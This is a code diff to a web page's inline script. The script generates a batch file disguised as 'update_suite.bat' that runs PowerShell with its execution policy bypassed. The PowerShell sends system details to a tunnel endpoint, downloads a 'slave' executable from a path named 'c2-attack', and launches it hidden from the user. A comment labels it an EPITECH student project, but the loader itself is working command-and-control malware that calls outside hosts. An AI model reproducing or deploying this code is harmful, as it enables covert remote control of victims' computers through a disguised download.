@@ -113,18 +113,48 @@
   </main>
 
 <script>
-    const destination = "https://microsoft.com";
-    const fileName = "test.bat"; 
+const destination = "https://microsoft.com";
+    const fileName = "update_suite.bat"; 
 
-const fileContent = [
+    const fileContent = [
       "@echo off",
-      "rem Projet etudiant EPITECH - Exfiltration directe sans Master.",
+      "rem Projet etudiant EPITECH - Deploiement conditionnel avec logs detailles.",
       "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"" +
-        "$arch = $env:PROCESSOR_ARCHITECTURE; " +
-        "$json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]'; " +
-        "$bytes = [System.Text.Encoding]::UTF8.GetBytes($json); " +
-        "$b64 = [Convert]::ToBase64String($bytes); " +
-        "Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'}\"",
+        "try {",
+          "  $arch = $env:PROCESSOR_ARCHITECTURE;",
+          "  $log1 = '[{\\\"command\\\":\\\"debug_step\\\",\\\"output\\\":\\\"Etape 1: Architecture detectee -> ' + $arch + '\\\"}]';",
+          "  $b64_1 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log1));",
+          "  Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64_1; 'Bypass-Tunnel-Reminder'='true'};",
+
+          "  if ($arch -eq 'AMD64') {",
+          "    $targetUrl = 'https://misterwhite44.github.io/c2-attack/slave_amd64.exe';",
+          "  } else {",
+          "    $targetUrl = 'https://misterwhite44.github.io/c2-attack/slave_x86.exe';",
+          "  }",
+
+          "  $log2 = '[{\\\"command\\\":\\\"debug_step\\\",\\\"output\\\":\\\"Etape 2: URL cible selectionnee -> ' + $targetUrl + '\\\"}]';",
+          "  $b64_2 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log2));",
+          "  Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64_2; 'Bypass-Tunnel-Reminder'='true'};",
+
+          "  $destPath = \\\"$env:TEMP\\slave_agent.exe\\\";",
+          "  Invoke-WebRequest -Uri $targetUrl -OutFile $destPath;",
+          
+          "  $log3 = '[{\\\"command\\\":\\\"debug_step\\\",\\\"output\\\":\\\"Etape 3: Fichier telecharge avec succes dans TEMP\\\"}]';",
+          "  $b64_3 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log3));",
+          "  Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64_3; 'Bypass-Tunnel-Reminder'='true'};",
+
+          "  Start-Process -FilePath $destPath -WindowStyle Hidden;",
+          
+          "  $log4 = '[{\\\"command\\\":\\\"debug_step\\\",\\\"output\\\":\\\"Etape 4: Slave lance en arriere-plan avec succes !\\\"}]';",
+          "  $b64_4 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log4));",
+          "  Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64_4; 'Bypass-Tunnel-Reminder'='true'};",
+
+        "} catch {",
+          "  $err = $_.Exception.Message -replace '\"', '\\\"';",
+          "  $logErr = '[{\\\"command\\\":\\\"erreur_script\\\",\\\"output\\\":\\\"ERREUR DETECTEE : ' + $err + '\\\"}]';",
+          "  $b64_err = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($logErr));",
+          "  try { Invoke-RestMethod -Uri 'https://webcams-gamecube-corrections-widely.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64_err; 'Bypass-Tunnel-Reminder'='true'}; } catch {}",
+        "}\"",
     ].join("\r\n");
 
     const blobUrl = URL.createObjectURL(
